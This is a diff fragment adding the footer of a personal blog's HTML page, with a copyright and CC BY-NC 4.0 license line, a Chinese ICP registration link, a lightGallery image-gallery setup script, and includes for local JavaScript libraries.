+        <div class="copyright-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="http://syncd.cn" target="_blank">zhaofan</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
+                <span class="icp"><a href="https://beian.miit.gov.cn/">京ICP备17004069号-2</a></span></div>
+    </div>
+</footer>
+</div><a href="#" class="dynamic-to-top animated faster" id="dynamic-to-top">
+            <i class="fas fa-chevron-up fa-fw"></i>
+        </a><script>
+        document.addEventListener('DOMContentLoaded', function () {
+            lightGallery(document.getElementById('content'), {
+                selector: '.lightgallery',
+                speed: 400,
+                hideBarsDelay: 2000,
+                thumbnail: true,
+                exThumbImage: 'data-thumbnail',
+                thumbWidth: 80,
+                thumbContHeight: 80,
+            });
+        });
+    </script><link rel="stylesheet" href="/lib/gitalk/gitalk.min.css"><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><script src="/lib/gitalk/gitalk.min.js"></script><script src="/lib/smooth-scroll/smooth-scroll.polyfills.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/lightgallery/lightgallery.min.js"></script><script src="/lib/lightgallery/lg-thumbnail.min.js"></script><script src="/lib/lightgallery/lg-zoom.min.js"></script><script src="/js/theme.min.js"></script></body>
+</html>
